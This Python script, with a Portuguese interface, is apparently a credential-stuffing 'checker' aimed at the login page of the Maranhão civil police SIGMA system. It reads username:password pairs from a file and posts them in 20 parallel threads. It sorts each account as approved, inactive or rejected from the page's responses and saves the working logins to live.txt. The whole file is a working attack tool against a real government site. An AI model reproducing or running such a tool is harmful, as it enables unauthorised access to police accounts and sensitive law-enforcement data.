import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import os
from colorama import Fore, Style, init

init(autoreset=True)

class SigmaChecker:
    def __init__(self):
        self.stats = {
            'total': 0,
            'approved': 0,
            'rejected': 0,
            'inactive': 0,
            'errors': 0,
            'invalid': 0
        }
        self.session = requests.Session()
        self.start_time = time.time()

    def show_panel(self):
        elapsed = time.time() - self.start_time
        print("\033[H\033[J")  # Limpa o terminal
        print(Fore.CYAN + "══════════════════════════════════")
        print(Fore.YELLOW + "     SIGMA CHECKER - POLÍCIA MA")
        print(Fore.CYAN + "══════════════════════════════════")
        print(f"{Fore.GREEN}✅ Aprovados: {self.stats['approved']}")
        print(f"{Fore.RED}❌ Reprovados: {self.stats['rejected']}")
        print(f"{Fore.YELLOW}⚠ Inativos: {self.stats['inactive']}")
        print(f"{Fore.MAGENTA}✖ Inválidos: {self.stats['invalid']}")
        print(f"{Fore.RED}⚠ Erros: {self.stats['errors']}")
        print(Fore.CYAN + "══════════════════════════════════")
        print(f"{Fore.WHITE}Total: {self.stats['total']}")
        print(f"Tempo: {elapsed:.2f}s")
        print(Fore.CYAN + "══════════════════════════════════")

    def check_login(self, username, password):
        url = 'https://sigma.policiacivil.ma.gov.br/'
        payload = {
            'username': username,
            'password': password
        }

        try:
            response = self.session.post(url, data=payload, timeout=15)
            
            if 'Usuário ou senha incorretos' not in response.text:
                if 'Sua conta encontra-se inativa' not in response.text:
                    return "APPROVED", username, password
                else:
                    return "INACTIVE", username, password
            return "REJECTED", username, password

        except Exception as e:
            return "ERROR", username, str(e)

    def process_line(self, line):
        self.stats['total'] += 1
        
        try:
            username, password = line.strip().split(':', 1)
            if not username or not password:
                raise ValueError
        except ValueError:
            self.stats['invalid'] += 1
            return None

        status, username, message = self.check_login(username, password)

        if status == "APPROVED":
            self.stats['approved'] += 1
            with open('live.txt', 'a') as f:
                f.write(f"{username}:{password}\n")
            return f"{Fore.GREEN}✅ APROVADO | {username}:{password}"
        elif status == "INACTIVE":
            self.stats['inactive'] += 1
            return f"{Fore.YELLOW}⚠ INATIVO | {username}:{password}"
        elif status == "REJECTED":
            self.stats['rejected'] += 1
            return f"{Fore.RED}❌ REPROVADO | {username}:{password}"
        else:
            self.stats['errors'] += 1
            return f"{Fore.RED}⚠ ERRO | {username} | {message}"

def main():
    checker = SigmaChecker()
    
    if not os.path.exists('logins.txt'):
        print(Fore.RED + "Erro: Arquivo 'logins.txt' não encontrado!")
        return

    try:
        with open('logins.txt', 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(Fore.RED + f"Erro ao ler arquivo: {e}")
        return

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(checker.process_line, line): line for line in lines}
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(result)
            checker.show_panel()

    print(Fore.GREEN + "\nVerificação concluída! Resultados salvos em live.txt")

if __name__ == "__main__":
    main()